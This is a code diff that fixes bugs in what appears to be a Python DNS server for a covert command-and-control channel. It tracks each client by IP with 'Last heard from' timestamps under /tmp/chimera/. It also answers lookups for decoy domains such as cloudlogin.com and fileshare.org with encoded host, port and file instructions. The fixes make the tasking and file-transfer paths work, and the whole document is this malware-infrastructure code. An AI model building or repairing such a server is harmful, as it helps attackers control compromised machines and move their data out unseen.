@@ -60,7 +60,7 @@ def sendResponseB(sock, data, addr, destIP, destPort):
         value2 = "0"
     else:
         value1 = "255"
-        value2 = str(destPort - 255)
+        value2 = str(int(destPort) - 255)
     handleResponse(sock, data, addr, [destIP, value1 + "." + value2 + "." + str(random.randint(1,254)) + ".3"])
     
 def sendResponseC(sock, data, addr, fileName):
@@ -106,7 +106,7 @@ def run(bind_ip=LISTEN_IP, port=53):
 
         print(f"[>] Message from {addr[0]}:{addr[1]} for {domain}")
         
-        if not (os.path.exists("/tmp/chimera/"):
+        if not (os.path.exists("/tmp/chimera/")):
             os.system("mkdir /tmp/chimera/")
         
         filePath = "/tmp/chimera/" + addr[0]
@@ -140,20 +140,20 @@ def run(bind_ip=LISTEN_IP, port=53):
                 host = addressSplit[0]
                 port = addressSplit[1]
             else:
-                host = 100.100.100.100
+                host = "100.100.100.100"
                 port = 100
             sendResponseB(sock, data, addr, host, port)
         elif (domain == "cloudlogin.com"): #Send file conts
-            if(len(contSplit) >= 1):
+            if(len(contSplit) > 1):
                 address = contSplit[0]
                 del(contSplit[0])
                 addressSplit = address.split(':')
                 host = addressSplit[0]
                 port = addressSplit[1]
             else:
-                host = 100.100.100.100
+                host = "100.100.100.100"
                 port = 100
-            sendResponseB(sock, data, addr, "127.0.0.1", 279)
+            sendResponseB(sock, data, addr, host, port)
         elif (domain == "fileshare.org"): #Get filename
             if(len(contSplit) >= 1):
                 fileName = contSplit[0]
@@ -163,7 +163,7 @@ def run(bind_ip=LISTEN_IP, port=53):
                 sendResponseA(sock, data, addr, 100)
             
         newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
-        newCont = newContSplit.join('\n')
+        newCont = '\n'.join(newContSplit)
         f = open(filePath, "w")
         f.write(newCont)
         f.close()
